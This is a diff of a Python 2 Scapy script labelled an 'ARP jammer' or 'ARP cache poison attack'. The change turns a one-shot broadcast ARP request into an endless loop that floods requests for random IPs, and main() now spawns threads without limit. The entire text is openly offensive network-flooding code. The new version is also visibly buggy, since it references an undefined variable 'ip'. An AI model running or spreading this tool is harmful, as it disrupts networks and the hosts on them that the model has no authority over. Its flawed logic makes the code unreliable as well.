@@ -2,8 +2,9 @@
 from scapy.all import *
 import random
 import sys
+import threading
 
-packet_count=1000
+
 conf.verb=0
 
 def get_random_ip():
@@ -14,14 +15,20 @@ def get_random_ip():
     random_ip = str(a) + "." + str(b) + "."+ str(c) + "."+ str(d)
     return random_ip
 
-def arp_jammer(ip):
-    try:
-        srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
-        print "send " + ip + " sucess!"
-    except KeyboardInterrupt:
-        print "finished!"
-    print "[*] ARP cache poison attack finished."
-    return
+def arp_jammer():
+    while True:
+        try:
+            a = random.randint(1, 254)
+            b = random.randint(1, 254)
+            c = random.randint(1, 254)
+            d = random.randint(1, 254)
+            random_ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
+            srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=random_ip), timeout=2, verbose=0)
+            print "send " + ip + " sucess!"
+        except KeyboardInterrupt:
+            print "[*] ARP attack finished."
+            sys.exit(0)
+
 
 
 def main():
@@ -38,12 +45,14 @@ def main():
 
     try:
         while True:
-            arp_jammer(get_random_ip())
+            jammer_thread = threading.Thread(target=arp_jammer)
+            jammer_thread.start()
 
     except KeyboardInterrupt:
+        print "[*] ARP attack thread finished."
         sys.exit(0)
 
 if __name__ == "__main__":
-    import cProfile
-    cProfile.run("main()", filename="analysis.out", sort="cumulative")
-    #main()
+    #import cProfile
+    #cProfile.run("main()", filename="analysis.out", sort="cumulative")
+    main()
